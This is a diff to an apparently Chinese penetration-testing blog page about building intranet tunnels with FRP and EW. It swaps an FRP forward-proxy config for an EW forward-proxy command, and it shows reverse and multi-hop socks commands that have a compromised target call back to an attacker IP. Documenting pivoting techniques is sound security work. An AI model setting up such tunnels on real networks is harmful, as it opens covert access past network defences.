@@ -40,7 +40,7 @@
 <meta itemprop="name" content="内网穿透工具的使用">
 <meta itemprop="description" content="隧道搭建">
 <meta itemprop="dateModified" content="2021-09-04T00:00:00+00:00" />
-<meta itemprop="wordCount" content="4298">
+<meta itemprop="wordCount" content="4269">
 <meta itemprop="keywords" content="流量代理,内网渗透," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="内网穿透工具的使用"/>
 <meta name="twitter:description" content="隧道搭建"/>
@@ -461,7 +461,7 @@ function tagCloud(where, min, max) {
     <a class="article-tag-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"> 内网渗透 </a>
   </span>
 
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 4298字</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 4269字</span>
 		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 9分 </span>
       </div>
     </div>
@@ -508,39 +508,7 @@ proxifier注册码
 <h1 id="0x04-各种协议隧道">0x04 各种协议隧道</h1>
 <h2 id="一socks代理">一、Socks代理</h2>
 <h3 id="1-frp隧道">1. FRP隧道</h3>
-<h4 id="11-正向代理">1.1 正向代理</h4>
-<h5 id="1在客户端配置">1、在客户端配置</h5>
-<pre><code>[common]
-bind_addr = 0.0.0.0
-bind_port = 7000
-token = 123456
-</code></pre>
-<p>配置好之后运行<code>frps.exe -c frps.ini</code></p>
-<h5 id="2在vps中配置">2、在vps中配置</h5>
-<p>frpc.ini</p>
-<pre><code>[common]
-# 填写客户端的
-server_addr = 10.108.3.58
-server_port = 7000
-token = 123456
-
-[plugin_http_proxy]
-type = tcp
-remote_port = 7890
-plugin = http_proxy
-# 可以添加认证
-# plugin_http_user = abc
-# plugin_http_passwd = abc
-
-[plugin_socks5]
-type = tcp
-remote_port = 7891
-plugin = socks5
-# plugin_user = abc
-# plugin_passwd = abc
-</code></pre>
-<p>配置好之后运行<code>frpc.exe -c frpc.ini</code></p>
-<h4 id="12-反向代理">1.2. 反向代理</h4>
+<h4 id="11-反向代理">1.1. 反向代理</h4>
 <p>目的：</p>
 <pre><code>1.需要通过公网服务器代理连接内网机器
 2.需要通过代理使得本机外网地址变为该内网机器外网IP
@@ -587,7 +555,7 @@ Target hosts处添加允许通过的IP（一般内网我都会只让内网的IP�
 <p><img src="./images/20210721002944989_28306.png" alt=""></p>
 <p>尝试访问内网地址</p>
 <p><img src="./images/20210721003019909_30798.png" alt=""></p>
-<h4 id="13多层socks代理">1.3.多层socks代理</h4>
+<h4 id="12多层socks代理">1.2.多层socks代理</h4>
 <p>实验环境：内网C主机不能直接连接vps，可以连接内网B主机，B主机可以直接连接vps，所以通过B作为跳板，将socks代理建设在内网C主机中</p>
 <p><img src="./images/image-20210725004808097.png" alt="image-20210725004808097"></p>
 <p>具体思路：利用B即作为服务端(frps)，也同时作为客户端(frpc)</p>
@@ -652,7 +620,12 @@ local_port = 7777
 <p><img src="images/image-20210725011338666.png" alt="image-20210725011338666"></p>
 <p>说明代理没问题</p>
 <h3 id="2ew">2.EW</h3>
-<h4 id="21反向代理">2.1、反向代理</h4>
+<h4 id="21--正向代理">2.1  正向代理</h4>
+<p>正向连接需要目标主机有一个公网 IP，或者说攻击主机能够直接访问到目标主机。</p>
+<pre><code>ew -s ssocksd -l 10899
+</code></pre>
+<p>使用 SocksCap、Proxifier、ProxyChains 等工具配置上目标主机的 IP 和监听端口即可</p>
+<h4 id="22反向代理">2.2、反向代理</h4>
 <p>攻击机：</p>
 <pre><code>ew -s rcsocks -l 1081 -e 1080
 
@@ -661,7 +634,7 @@ local_port = 7777
 <p>靶机</p>
 <pre><code>ew -s rssocks -d 攻击机IP -e 1080
 </code></pre>
-<h4 id="22多层代理">2.2、多层代理</h4>
+<h4 id="23多层代理">2.3、多层代理</h4>
 <pre><code>获得目标网络内两台主机 A、B 的权限，情况描述如下：
 
 A 主机：  目标网络的边界主机，无公网 IP，无法访问特定资源。
